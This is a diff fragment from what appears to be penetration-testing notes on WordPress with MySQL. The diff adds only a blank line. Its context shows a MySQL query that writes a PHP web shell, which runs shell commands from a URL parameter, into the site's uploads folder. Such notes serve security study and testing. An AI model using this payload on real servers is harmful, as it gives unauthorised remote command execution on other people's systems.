@@ -123,3 +123,4 @@ Take a wordpress installation that uses a mysql database. If you manage to login
 ```mysql
 Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
 ```
+
